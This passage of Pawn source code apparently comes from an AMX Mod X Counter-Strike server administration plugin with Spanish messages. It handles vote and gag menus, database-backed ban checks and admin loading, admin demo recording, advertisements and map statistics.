		showMenu__VoteMapMenu(id);
		return;
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Salir");

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId);
}

public menu__VoteMapMenuView(const id, const menu, const item) {
	if(!is_user_connected(id)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);

		showMenu__VoteMapMenu(id);
		return PLUGIN_HANDLED;
	}

	new iItemId;
	new sPosition[3];
	new sMapMenu[MAX_CHARACTER_MAPNAME];
	new sMap[MAX_CHARACTER_MAPNAME];
	new i;

	menu_item_getinfo(menu, item, iItemId, sPosition, charsmax(sPosition), sMapMenu, charsmax(sMapMenu), iItemId);
	DestroyLocalMenu(id, menu);

	iItemId = (str_to_num(sPosition) - 1);

	for(i = 0; i < g_VoteMap_AllMaps; ++i) {
		formatex(sMap, charsmax(sMap), "%a", ArrayGetStringHandle(g_aMapName, i));
		strtolower(sMap);

		if(equal(sMapMenu, sMap)) {
			iItemId = i;
			break;
		}
	}
	
	for(i = 0; i < MAX_VOTES; ++i) {
		if(g_VoteMapChoose_Id[id][i] == iItemId) {
			clientPrintColor(id, _, "Se removió el mapa !g%a!y de tu lista.", ArrayGetStringHandle(g_aMapName, g_VoteMapChoose_Id[id][i]));

			g_VoteMapChoose_Id[id][i] = -1;
			break;
		}
	}

	showMenu__VoteMapMenuView(id);
	return PLUGIN_HANDLED;
}

public showMenu__Vote(const id, const to_admin) {
	if(g_Vote_End) {
		return;
	}

	oldmenu_create("\yVOTACIÓN%s - %s^n\wAdministrador\r:\y %s", "menu__Vote", ((to_admin == 999) ? " DE MAPAS" : ((to_admin == 1) ? " PARA ADMINISTRADORES" : "")), g_Vote_Question, g_PlayerName[g_Vote_AdminId]);

	for(new i = 0, j = 1; i < MAX_VOTES; ++i, ++j) {
		if(!g_Vote_Answers[i][0]) {
			continue;
		}

		oldmenu_additem(j, i, "\r%d.\w %s", j, g_Vote_Answers[i]);
	}

	oldmenu_additem(0, 0, "^n\r0.\w No votar");
	oldmenu_display(id, 1, 15);
}

public menu__Vote(const id, const item, const value) {
	if(g_Vote_End) {
		client_cmd(id, "^"slot%d^"", item);

		clientPrintColor(id, _, "La votación ha finalizado.");
		return;
	} else if(g_Vote_AlreadyVote[id]) {
		client_cmd(id, "^"slot%d^"", item);

		clientPrintColor(id, _, "Ya has votado.");
		return;
	} else if(!item) {
		return;
	}

	g_Vote_Id[id] = value;
	g_Vote_AlreadyVote[id] = 1;

	++g_Vote_VoteCount[value];
	++g_Vote_MaxVotes;

	clientPrint(0, print_console, "%s ha votado %s", g_PlayerName[id], g_Vote_Answers[value]);
}

public showMenu__Gag(const id) {
	new iMenuId;
	new i;
	new sItem[64];
	new sPosition[2];

	iMenuId = menu_create("AMORDAZAR USUARIO\R", "menu__Gag");

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i) || g_Gag[i]) {
			continue;
		}

		formatex(sItem, charsmax(sItem), "%s%s", g_PlayerName[i], (((get_user_flags(i) & ADMIN_IMMUNITY)) ? " \r*" : ""));

		sPosition[0] = i;
		sPosition[1] = 0;

		menu_additem(iMenuId, sItem, sPosition);
	}

	if(menu_items(iMenuId) <= 0) {
		clientPrintColor(id, _, "No hay jugadores disponibles para mostrar en el menú.");

		DestroyLocalMenu(id, iMenuId);
		return;
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Salir");

	g_MenuPage_Users[id] = min(g_MenuPage_Users[id], (menu_pages(iMenuId) - 1));

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId, 0);
}

public menu__Gag(const id, const menu, const item) {
	if(!is_user_connected(id)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new iItemId;
	player_menu_info(id, iItemId, iItemId, g_MenuPage_Users[id]);

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new sPosition[2];
	menu_item_getinfo(menu, item, iItemId, sPosition, charsmax(sPosition), _, _, iItemId);
	DestroyLocalMenu(id, menu);

	iItemId = sPosition[0];

	if(is_user_connected(iItemId)) {
		if(!g_Gag[iItemId]) {
			client_cmd(id, "amx_gag #%d 10", get_user_userid(iItemId));
		} else {
			clientPrintColor(id, _, "El jugador ya está amordazado.");
		}
	} else {
		clientPrintColor(id, _, "El jugador seleccionado se ha desconectado.");
	}

	showMenu__Gag(id);
	return PLUGIN_HANDLED;
}

public showMenu__UnGag(const id) {
	new iMenuId;
	new i;
	new sItem[64];
	new sPosition[2];

	iMenuId = menu_create("DESAMORDAZAR USUARIO\R", "menu__UnGag");

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i) || !g_Gag[i]) {
			continue;
		}

		formatex(sItem, charsmax(sItem), "%s%s", g_PlayerName[i], (((get_user_flags(i) & ADMIN_IMMUNITY)) ? " \r*" : ""));

		sPosition[0] = i;
		sPosition[1] = 0;

		menu_additem(iMenuId, sItem, sPosition);
	}

	if(menu_items(iMenuId) <= 0) {
		clientPrintColor(id, _, "No hay jugadores disponibles para mostrar en el menú.");

		DestroyLocalMenu(id, iMenuId);
		return;
	}

	menu_setprop(iMenuId, MPROP_BACKNAME, "Atrás");
	menu_setprop(iMenuId, MPROP_NEXTNAME, "Siguiente");
	menu_setprop(iMenuId, MPROP_EXITNAME, "Salir");

	g_MenuPage_Users[id] = min(g_MenuPage_Users[id], (menu_pages(iMenuId) - 1));

	fix_pdata_menu(id);
	ShowLocalMenu(id, iMenuId, 0);
}

public menu__UnGag(const id, const menu, const item) {
	if(!is_user_connected(id)) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new iItemId;
	player_menu_info(id, iItemId, iItemId, g_MenuPage_Users[id]);

	if(item == MENU_EXIT) {
		DestroyLocalMenu(id, menu);
		return PLUGIN_HANDLED;
	}

	new sPosition[2];
	menu_item_getinfo(menu, item, iItemId, sPosition, charsmax(sPosition), _, _, iItemId);
	DestroyLocalMenu(id, menu);

	iItemId = sPosition[0];

	if(is_user_connected(iItemId)) {
		if(g_Gag[iItemId]) {
			client_cmd(id, "amx_ungag #%d", get_user_userid(iItemId));
		} else {
			clientPrintColor(id, _, "El jugador no está amordazado.");
		}
	} else {
		clientPrintColor(id, _, "El jugador seleccionado se ha desconectado.");
	}

	showMenu__UnGag(id);
	return PLUGIN_HANDLED;
}

public task__SoundIntro(const task_id) {
	new iId = (task_id - TASK_SOUND_INTRO);

	if(!is_user_connected(iId)) {
		return;
	}

	if(equal(g_PlayerSteamId[iId], "STEAM_0:1:424403388")) { // El que no quiere escuchar el sonido de intro, hago esto.
		return;
	}

	playSound(iId, __SOUND_INTRO);
}

public task__CheckBan(const task_id) {
	new iId = (task_id - TASK_CHECK_BAN);

	if(!is_user_connected(iId)) {
		return;
	}

	new Handle:sqlQuery = SQL_PrepareQuery(g_SqlConnection, "SELECT * FROM `gral_bans` WHERE ((`user_authid`=^"%s^" OR `user_authid`=^"%s^") AND `finish`>'%d' AND (`server_id`='0' OR `server_id`='%d') AND active='1');", g_PlayerIp[iId], g_PlayerSteamId[iId], get_arg_systime(), g_ServerId);

	if(!SQL_Execute(sqlQuery)) {
		executeQuery(iId, sqlQuery, 8);
	} else if(SQL_NumResults(sqlQuery)) {
		new sAdminName[MAX_NAME_LENGTH];
		new sAdminAuthid[MAX_AUTHID_LENGTH];
		new sUserName[MAX_NAME_LENGTH];
		new sUserAuthid[MAX_AUTHID_LENGTH];
		new iStart;
		new iMinutes;
		new iFinish;
		new sReason[64];

		SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "admin_name"), sAdminName, charsmax(sAdminName));
		SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "admin_authid"), sAdminAuthid, charsmax(sAdminAuthid));
		SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "user_name"), sUserName, charsmax(sUserName));
		SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "user_authid"), sUserAuthid, charsmax(sUserAuthid));
		iStart = SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "start"));
		iMinutes = SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "minutes"));
		iFinish = SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "finish"));
		SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "reason"), sReason, charsmax(sReason));
		SQL_FreeHandle(sqlQuery);

		showBanInfo(iId, sAdminName, sAdminAuthid, sUserName, sUserAuthid, iStart, iMinutes, iFinish, sReason, 1, 1);

		remove_task(iId + TASK_CHECK_BAN_KICKED);
		set_task(1.1, "task__CheckBanKicked", iId + TASK_CHECK_BAN_KICKED);
	} else {
		SQL_FreeHandle(sqlQuery);

		remove_task(iId+ TASK_DISPLAY_HELP);
		set_task(15.1, "task__DisplayHelp", iId + TASK_DISPLAY_HELP);

		if(!is_user_bot(iId) && !is_user_hltv(iId) && (get_user_flags(iId) & ADMIN_RESERVATION)) {
			remove_task(iId + TASK_UPDATE_INFO_PRE);
			set_task(5.0, "task__UpdateInfoPre", iId + TASK_UPDATE_INFO_PRE);
		}
	}
}

public task__CheckBanKicked(const task_id) {
	new iId = (task_id - TASK_CHECK_BAN_KICKED);

	if(!is_user_connected(iId)) {
		return;
	}

	rh_drop_client(iId, "Estás baneado del servidor. Revisa tu consola para más información.");
}

public task__DisplayHelp(const task_id) {
	new iId = (task_id - TASK_DISPLAY_HELP);

	if(!is_user_connected(iId)) {
		return;
	}

	new sHour[3];
	new iHour;
	new sBuffer[16];

	get_time("%H", sHour, charsmax(sHour));
	iHour = str_to_num(sHour);

	if((6 <= iHour <= 12)) {
		formatex(sBuffer, charsmax(sBuffer), "Buenos días");
	} else if((13 <= iHour <= 18)) {
		formatex(sBuffer, charsmax(sBuffer), "Buenas tardes");
	} else {
		formatex(sBuffer, charsmax(sBuffer), "Buenas noches");
	}

	clientPrintColor(iId, print_team_grey, "!y¡%s !t%s!y! - ¡Bienvenido a !g%s!y!.", sBuffer, g_PlayerName[iId], __PLUGIN_COMMUNITY_NAME);
	clientPrintColor(iId, print_team_grey, "!yEstás jugando en nuestro servidor !g%s!y.", getServerName(.with_numeral=1));

	if(g_ServerId != SV_NONE && __SERVERS[g_ServerId][serverIp][0] && __SERVERS[g_ServerId][serverPort][0]) {
		clientPrintColor(iId, print_team_grey, "!yIP del servidor !g%s:%s!y - Nuestro foro: !g%s!y.", __SERVERS[g_ServerId][serverIp], __SERVERS[g_ServerId][serverPort], __PLUGIN_COMMUNITY_FORUM);
	} else {
		clientPrintColor(iId, print_team_grey, "!yIP del servidor !gninguno!y - Nuestro foro: !g%s!y.", __PLUGIN_COMMUNITY_FORUM);
	}
}

public task__UpdateInfoPre(const task_id) {
	new iId = (task_id - TASK_UPDATE_INFO_PRE);
	new iUserFlags = get_user_flags(iId);

	if(!is_user_connected(iId) || !(iUserFlags & ADMIN_RESERVATION)) {
		return;
	}

	clientPrintColor(iId, _, "Chequeo de seguridad finalizado. %s activado.", (((iUserFlags & ADMIN_IMMUNITY)) ? "Admin" : "VIP"));

	remove_task(iId + TASK_UPDATE_INFO_POST);
	set_task(10.0, "task__UpdateInfoPost", iId + TASK_UPDATE_INFO_POST);

	new iAdmins[structAdmins];
	TrieGetArray(g_tAdmins, g_AdminName[iId], iAdmins, sizeof(iAdmins));

	if(!equal(iAdmins[adminLastIp], g_PlayerIp[iId]) || !equal(iAdmins[adminLastSteamId], g_PlayerSteamId[iId])) {
		new Handle:sqlQuery = SQL_PrepareQuery(g_SqlConnection, "UPDATE `gral_admins` SET `last_ip`=^"%s^", `last_steamid`=^"%s^" WHERE (`id`='%d');", g_PlayerIp[iId], g_PlayerSteamId[iId], iAdmins[adminId]);
		
		if(!SQL_Execute(sqlQuery)) {
			executeQuery(iId, sqlQuery, 9);
		} else {
			SQL_FreeHandle(sqlQuery);
		}

		log_amx("<%s> ha actualizado su último ingreso - Viejo <%s><%s> - Nuevo <%s><%s>", g_PlayerName[iId], iAdmins[adminLastIp], iAdmins[adminLastSteamId], g_PlayerIp[iId], g_PlayerSteamId[iId]);
	}
}

public task__UpdateInfoPost(const task_id) {
	new iId = (task_id - TASK_UPDATE_INFO_POST);
	new iUserFlags = get_user_flags(iId);

	if(!is_user_connected(iId) || !(iUserFlags & ADMIN_RESERVATION) || !g_AdminName[iId][0]) {
		return;
	}

	if((iUserFlags & ADMIN_IMMUNITY)) {
		new iAdmins[structAdmins];
		TrieGetArray(g_tAdmins, g_AdminName[iId], iAdmins, sizeof(iAdmins));

		if(!(1 <= iAdmins[adminDemo] <= 5)) {
			clientPrintColor(iId, _, "Grabación de demos desactivada.");
			return;
		}

		new sDate[16];
		new sHostName[64];
		new sDemoName[128];

		copy(sHostName, charsmax(sHostName), getServerName(.with_numeral=0));
		replace_all(sHostName, charsmax(sHostName), ":", "_");

		switch(iAdmins[adminDemo]) {
			case 1: { // Fecha
				get_time("%d-%m-%Y", sDate, charsmax(sDate));
				formatex(sDemoName, charsmax(sDemoName), "DG_%s_%s", sHostName, sDate);
			} case 2: { // Fecha y hora
				get_time("%d-%m-%Y_%H-%M", sDate, charsmax(sDate));
				formatex(sDemoName, charsmax(sDemoName), "DG_%s_%s", sHostName, sDate);
			} case 3: { // Mapa
				formatex(sDemoName, charsmax(sDemoName), "DG_%s_%s", sHostName, g_CurrentMap);
			} case 4: { // Fecha y mapa
				get_time("%d-%m-%Y", sDate, charsmax(sDate));
				formatex(sDemoName, charsmax(sDemoName), "DG_%s_%s_%s", sHostName, sDate, g_CurrentMap);
			} case 5: { // Fecha, hora y mapa
				get_time("%d-%m-%Y_%H-%M", sDate, charsmax(sDate));
				formatex(sDemoName, charsmax(sDemoName), "DG_%s_%s_%s", sHostName, sDate, g_CurrentMap);
			}
		}

		client_cmd(iId, "stop; record ^"%s^"", sDemoName);

		clientPrintColor(iId, _, "Estamos grabando una demo para administradores.");
		clientPrintColor(iId, _, "Archivo: !g%s.dem!y.", sDemoName);
	} else {
		clientPrintColor(iId, _, "Es importante que leas las reglas correspondientes para el mejor manejo de tu VIP, leelas en !t%s!y para más información.", __PLUGIN_COMMUNITY_FORUM_VIP);
		clientPrintColor(iId, _, "Recordá que mediante !gu!!y podes utilizar el canal privado para hablar con jugadores VIPs.");
	}
}

public task__Gag(const task_id) {
	new iId = (task_id - TASK_GAG);

	if(!is_user_connected(iId)) {
		return;
	}

	g_Gag[iId] = 0;

	new i;
	for(i = 1; i <= MaxClients; ++i) {
		if(is_user_connected(i)) {
			rg_set_can_hear_player(i, iId, true);
		}
	}

	clientPrintColor(0, iId, "!t%s!y ha sido desamordazado.", g_PlayerName[iId]);
}

public task__SetConfigs() {
	if(__SERVERS[g_ServerId][serverAutokickTimeout]) {
		set_cvar_num("mp_autokick_timeout", __SERVERS[g_ServerId][serverAutokickTimeout]);
	} else {
		set_cvar_num("mp_autokick_timeout", 120);
	}
}

public task__ReloadAdmins() {
	new iMinPlaying = (getUsersPlaying(TEAM_TERRORIST) + getUsersPlaying(TEAM_CT));

	if(iMinPlaying < 2) {
		return;
	}

	loadAdmins(.reload=1);
}

public task__SayAdmin() {
	g_AdminChatCount = 0;
	g_AdminChatMessage[0][0] = EOS;
	g_AdminChatMessage[1][0] = EOS;
	g_AdminChatMessage[2][0] = EOS;
	g_AdminChatMessage[3][0] = EOS;
}

public task__SocketsClose() {
	if(get_pcvar_num(g_pCvar_Servers)) {
		for(new i = 0; i < structIdServers; ++i) {
			if(g_Sockets[i]) {
				socket_close(g_Sockets[i]);
				g_Sockets[i] = false;
			}
		}
	}
}

public task__VoteEnd(const arg[]) {
	g_Vote_Init = 0;
	g_Vote_End = 1;

	new iVoteWin = 0;
	new iVoteWinId = -1;
	new i;

	for(i = 0; i < MAX_VOTES; ++i) {
		if(g_Vote_VoteCount[i] > iVoteWin) {
			iVoteWin = g_Vote_VoteCount[i];
			iVoteWinId = i;
		}
	}

	if(iVoteWinId == -1) {
		return;
	}

	new iArg = arg[0];

	for(i = 1; i <= MaxClients; ++i) {
		if(!is_user_connected(i) || (iArg == 1 && !(get_user_flags(i) & ADMIN_IMMUNITY))) {
			continue;
		}

		if(iVoteWin < 1) {
			clientPrintColor(i, _, "La votación%s no ha tenido una opción ganadora.", ((iArg == 999) ? " de mapas" : ""));
		} else {
			clientPrintColor(i, _, "Pregunta%s: !t%s!y.", ((iArg == 1) ? " para administradores" : ""), g_Vote_Question);
			clientPrintColor(i, _, "La respuesta ganadora es !t%s!y con !g%d!y / !g%d!y de votos.", g_Vote_Answers[iVoteWinId], iVoteWin, g_Vote_MaxVotes);
		}
	}

	if(iArg == 999) {
		setNextMap(g_Vote_Answers[iVoteWinId]);
	}
}

public task__ChangeMap(const map[]) {
	server_cmd("changelevel %s", map);
}

public loadSql() {
	new iErrorNum;
	new sErrors[256];

	g_SqlTuple = SQL_MakeDbTuple("127.0.0.1", __SERVERS[SV_NONE][serverSqlUsername], __SERVERS[SV_NONE][serverSqlPassword], __SERVERS[SV_NONE][serverSqlDatabase]);
	g_SqlConnection = SQL_Connect(g_SqlTuple, iErrorNum, sErrors, charsmax(sErrors));
	g_SqlQuery[0] = EOS;

	if(g_SqlConnection == Empty_Handle) {
		set_fail_state("loadSql() - Error en la conexión a la base de datos - [%d] %s.", iErrorNum, sErrors);
		return;
	}

	SQL_SetCharset(g_SqlTuple, "utf8mb4");

	g_ServerId = loadServerId();
	loadAdmins(.reload=0);
	loadBans();
	loadAdv();
	loadMaps();
}

public loadServerId() {
	new sServerIp[MAX_IP_WITH_PORT_LENGTH];
	new sIp[MAX_IP_LENGTH];
	new sPort[8];
	new iPort;
	new iServerId;

	get_user_ip(0, sServerIp, charsmax(sServerIp));
	strtok(sServerIp, sIp, charsmax(sIp), sPort, charsmax(sPort), ':');
	iPort = str_to_num(sPort);

	if(iPort >= DEFAULT_PORT) {
		iServerId = ((iPort - DEFAULT_PORT) + 1);
	} else {
		iServerId = 0;
	}

	return iServerId;
}

loadAdmins(const reload) {
	if(!reload) {
		g_tAdmins = TrieCreate();
	}

	new Handle:sqlQuery = SQL_PrepareQuery(g_SqlConnection, "SELECT * FROM `gral_admins` WHERE ((`access`<>'z' AND (`finish`='0' OR `finish`>'%d') AND (`server_id`='0' OR `server_id`='%d')) AND `suspend_id`='0') ORDER BY `access` ASC;", get_arg_systime(), g_ServerId);

	if(!SQL_Execute(sqlQuery)) {
		executeQuery(0, sqlQuery, 10);
	} else if(SQL_NumResults(sqlQuery)) {
		remove_user_flags(0, read_flags("z"));
		
		if(reload) {
			admins_flush();
			TrieClear(g_tAdmins);
		}

		g_AdminsCount = 0;

		new iAdmins[structAdmins];

		while(SQL_MoreResults(sqlQuery)) {
			iAdmins[adminId] = SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "id")); // 0 = ID
			SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "name"), iAdmins[adminName], charsmax(iAdmins[adminName])); // 1 = NAME
			SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "last_ip"), iAdmins[adminLastIp], charsmax(iAdmins[adminLastIp])); // 2 = LAST_IP
			SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "last_steamid"), iAdmins[adminLastSteamId], charsmax(iAdmins[adminLastSteamId])); // 3 = LAST_STEAMID
			SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "password"), iAdmins[adminPassword], charsmax(iAdmins[adminPassword])); // 4 = PASSWORD
			SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "access"), iAdmins[adminAccess], charsmax(iAdmins[adminAccess])); // 5 = ACCESS
			iAdmins[adminFinish] = SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "finish")); // 6 = FINISH
			iAdmins[adminForumId] = SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "forum_id")); // 7 = FORUM_ID
			iAdmins[adminServerId] = SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "server_id")); // 8 = SERVER_ID
			iAdmins[adminDemo] = SQL_ReadResult(sqlQuery, SQL_FieldNameToNum(sqlQuery, "demo")); // 9 = DEMO

			admins_push(iAdmins[adminName], iAdmins[adminPassword], read_flags(iAdmins[adminAccess]), read_flags("a"));
			TrieSetArray(g_tAdmins, iAdmins[adminName], iAdmins, sizeof(iAdmins));

			++g_AdminsCount;

			SQL_NextRow(sqlQuery);
		}

		log_amx("Se han cargado %d administrador%s desde la base de datos", g_AdminsCount, ((g_AdminsCount != 1) ? "es" : ""));
		SQL_FreeHandle(sqlQuery);

		if(!reload) {
			remove_task(TASK_RELOAD_ADMINS);
			set_task(60.0, "task__ReloadAdmins", TASK_RELOAD_ADMINS, .flags="b");
		}
	} else {
		log_amx("No hay administradores almacenados en la base de datos");
		SQL_FreeHandle(sqlQuery);
	}

	if(reload) {
		new sPlayers[MAX_PLAYERS];
		new iPlayerCount;

		get_players(sPlayers, iPlayerCount);

		if(iPlayerCount) {
			new i;
			new iUserId;

			for(i = 0; i < iPlayerCount; ++i) {
				iUserId = sPlayers[i];
				loadAdminAccess(iUserId, g_PlayerName[iUserId], g_PlayerIp[iUserId], g_PlayerSteamId[iUserId]);
			}
		}
	}
}

public loadBans() {
	new sErrors[512];

	g_rIpPattern = regex_compile(__REGEX_IP_PATTERN, g_rReturn, sErrors, charsmax(sErrors));
	g_rSteamIdPattern = regex_compile(__REGEX_STEAMID_PATTERN, g_rReturn, sErrors, charsmax(sErrors));
	g_BansEnt = rg_create_entity("info_target");

	if(is_entity(g_BansEnt)) {
		set_entvar(g_BansEnt, var_classname, __ENT_CLASSNAME_BANS);
		set_entvar(g_BansEnt, var_nextthink, (get_gametime() + BANS_NEXTTHINK));

		SetThink(g_BansEnt, "think__Bans");
	}
}

public loadAdv() {
	new Handle:sqlQuery = SQL_PrepareQuery(g_SqlConnection, "SELECT `message` FROM `gral_advertisements` WHERE (`message_timestamp`>'%d' AND (`server_id`='0' OR `server_id`='%d')) ORDER BY `id` ASC;", get_arg_systime(), g_ServerId);

	if(!SQL_Execute(sqlQuery)) {
		executeQuery(0, sqlQuery, 11);
	} else if(SQL_NumResults(sqlQuery)) {
		g_AdvTotal = 0;
		g_AdvNotice = 0;

		while(SQL_MoreResults(sqlQuery)) {
			SQL_ReadResult(sqlQuery, 0, g_AdvMessage[g_AdvTotal], charsmax(g_AdvMessage[]));

			replace_all(g_AdvMessage[g_AdvTotal], charsmax(g_AdvMessage[]), "!g", "^4");
			replace_all(g_AdvMessage[g_AdvTotal], charsmax(g_AdvMessage[]), "!t", "^3");
			replace_all(g_AdvMessage[g_AdvTotal], charsmax(g_AdvMessage[]), "!y", "^1");

			++g_AdvTotal;

			if(g_AdvTotal == MAX_ADVS) {
				break;
			}

			SQL_NextRow(sqlQuery);
		}

		g_AdvEnt = rg_create_entity("info_target");

		if(is_entity(g_AdvEnt)) {
			set_entvar(g_AdvEnt, var_classname, __ENT_CLASSNAME_ADV);
			set_entvar(g_AdvEnt, var_nextthink, (get_gametime() + ADV_NEXTTHINK));

			SetThink(g_AdvEnt, "think__Adv");
		}

		SQL_FreeHandle(sqlQuery);
	} else {
		SQL_FreeHandle(sqlQuery);
	}
}

public loadMaps() {
	g_VoteMap_AllMaps = 0;

	new sMapsFile[64];
	new iFile;

	get_localinfo("amxx_configsdir", sMapsFile, charsmax(sMapsFile));
	format(sMapsFile, charsmax(sMapsFile), "%s/maps.ini", sMapsFile);

	if(!file_exists(sMapsFile)) {
		iFile = fopen(sMapsFile, "wt");
		
		if(iFile) {
			fclose(iFile);
		}
	}

	iFile = fopen(sMapsFile, "rt");

	if(iFile) {
		new sBuffer[256];
		new sMap[MAX_CHARACTER_MAPNAME];

		while(!feof(iFile)) {
			sBuffer[0] = EOS;
			sMap[0] = EOS;

			fgets(iFile, sBuffer, charsmax(sBuffer));
			parse(sBuffer, sMap, charsmax(sMap));

			if(getValidMap(sMap)) {
				if(sMap[0] != ';' && !equali(sMap, g_LastMap) && !equali(sMap, g_CurrentMap)) {
					ArrayPushString(g_aMapName, sMap);
					++g_VoteMap_AllMaps;
				}
			} else {
				log_amx("No se ha encontrado el mapa %s", sMap);
			}
		}

		fclose(iFile);
	}
}

public saveMapStats() {
	if(g_ServerId < 1) {
		return;
	}

	new Handle:sqlQuery = SQL_PrepareQuery(g_SqlConnection, "SELECT `count` FROM `gral_maps` WHERE (`mapname`=^"%s^" AND `server_id`='%d');", g_CurrentMap, g_ServerId);

	if(!SQL_Execute(sqlQuery)) {
		executeQuery(0, sqlQuery, 12);
	} else if(SQL_NumResults(sqlQuery)) {
		new iCount = (SQL_ReadResult(sqlQuery, 0) + 1);

		SQL_FreeHandle(sqlQuery);

		sqlQuery = SQL_PrepareQuery(g_SqlConnection, "UPDATE `gral_maps` SET `count`='%d' WHERE (`mapname`=^"%s^" AND `server_id`='%d');", iCount, g_CurrentMap, g_ServerId);

		if(!SQL_Execute(sqlQuery)) {
			executeQuery(0, sqlQuery, 13);
		} else {
			SQL_FreeHandle(sqlQuery);
		}
	} else {
		SQL_FreeHandle(sqlQuery);

		sqlQuery = SQL_PrepareQuery(g_SqlConnection, "INSERT INTO `gral_maps` (`mapname`, `count`, `server_id`) VALUES (^"%s^", '%d', '%d');", g_CurrentMap, 1, g_ServerId);
		
		if(!SQL_Execute(sqlQuery)) {
			executeQuery(0, sqlQuery, 14);
		} else {
			SQL_FreeHandle(sqlQuery);
		}
	}
}

public refreshServers() {
	if(!get_pcvar_num(g_pCvar_Servers)) {
		return;
	}

	new sIp[MAX_IP_LENGTH];
	new sPort[8];
	new sServerIp[MAX_IP_WITH_PORT_LENGTH];
	new i;

	for(i = 0; i < structIdServers; ++i) {
		if(i == SV_NONE) {
			continue;
		}

		formatex(sServerIp, charsmax(sServerIp), "%s:%s", __SERVERS[i][serverIp], __SERVERS[i][serverPort]);
		strtok(sServerIp, sIp, charsmax(sIp), sPort, charsmax(sPort), ':', 1);

		g_Sockets[i] = socket_create(SOCK_TYPE_UDP, i);
		socket_sendto(g_Sockets[i], sIp, str_to_num(sPort), __AS2_INFO, strlen(__AS2_INFO));
	}

	remove_task(TASK_SOCKETS_CLOSE);
	set_task(1.5, "task__SocketsClose", TASK_SOCKETS_CLOSE);
}

public getAdminTypeInChat(const id) {
	new iUserFlag = get_user_flags(id);
	new sAdminType[32];

	if((iUserFlag & ADMIN_RCON)) {
		formatex(sAdminType, charsmax(sAdminType), "(DIRECTOR)");
	} else if((iUserFlag & ADMIN_LEVEL_H)) {
		formatex(sAdminType, charsmax(sAdminType), "(SUPER MOD)");
	} else if((iUserFlag & ADMIN_LEVEL_G)) {
		formatex(sAdminType, charsmax(sAdminType), "(MOD)");
	} else if((iUserFlag & ADMIN_LEVEL_F)) {
		formatex(sAdminType, charsmax(sAdminType), "(DESARROLLADOR)");
	} else if((iUserFlag & ADMIN_LEVEL_E)) {
		formatex(sAdminType, charsmax(sAdminType), "(MÁNAGER)");
	} else if((iUserFlag & ADMIN_LEVEL_D)) {
		formatex(sAdminType, charsmax(sAdminType), "(CAPITÁN)");
	} else if((iUserFlag & ADMIN_IMMUNITY)) {
		formatex(sAdminType, charsmax(sAdminType), "(ADMIN)");
	} else if((iUserFlag & ADMIN_RESERVATION)) {
		formatex(sAdminType, charsmax(sAdminType), "(VIP)");
	} else {
		formatex(sAdminType, charsmax(sAdminType), "(JUGADOR)");
	}

	return sAdminType;
}

public executeQuery(const id, const Handle:query, const query_id) {
	new sErrors[256];
	SQL_QueryError(query, sErrors, charsmax(sErrors));
	log_to_file(__SQL_LOG_FILE, "#%d - executeQuery() - [%d] - <%s>", id, query_id, sErrors);

	if(isUserValidConnected(id)) {
		rh_drop_client(id, "Hubo un error al realizar una consulta y por seguridad has sido expulsado.");
	}

	SQL_FreeHandle(query);
}

public getValidMap(map[]) {
	if(is_map_valid(map)) {
		return 1;
	}

	new iLen = (strlen(map) - 4);

	if(iLen < 0) {
		return 0;
	}

	if(equali(map[iLen], ".bsp")) {
		map[iLen] = EOS;

		if(is_map_valid(map)) {
			return 1;
		}
	}

	return 0;
}

public checkStringInvalid(string[]) {
	new iLen = strlen(string);

	if(!iLen) {
		return 0;
	}

	new const __BLOCK_CHARACTERS[] = {'^3', '^4', '#', '%'};
	new i;
	new j;
	new iSkip = 0;
	new iSpace = 1;
	new iCount = 0;

	for(i = 0, j = 0; i < iLen; ++i) {
		for(j = 0 ; j < sizeof(__BLOCK_CHARACTERS); ++j) {
			if(string[i] == __BLOCK_CHARACTERS[j]) {
				iSkip = 1;
				continue;
			}
		}

		if(iSkip) {
			iSkip = 0;
			continue;
		}

		if(string[i] == 32) {
			if(iSpace) {
				continue;
			}

			iSpace = 1;
		} else {
			iSpace = 0;
		}

		string[iCount++] = string[i];
	}

	string[iCount] = EOS;
	return (iCount != iLen);
}

public checkStringOnSpam(const string[]) {
	new iErrorNum;
	new sErrors[256];
	new Regex:rRegex = regex_match(string, __REGEX_IP_PATTERN, iErrorNum, sErrors, charsmax(sErrors));

	if(rRegex > REGEX_NO_MATCH) {
		regex_free(rRegex);
		return 1;
	}

	return 0;
}

public checkStringTrim(const string[]) {
	new iLen = strlen(string);
	new i;

	if(iLen) {
		for(i = 0; i < iLen; ++i) {
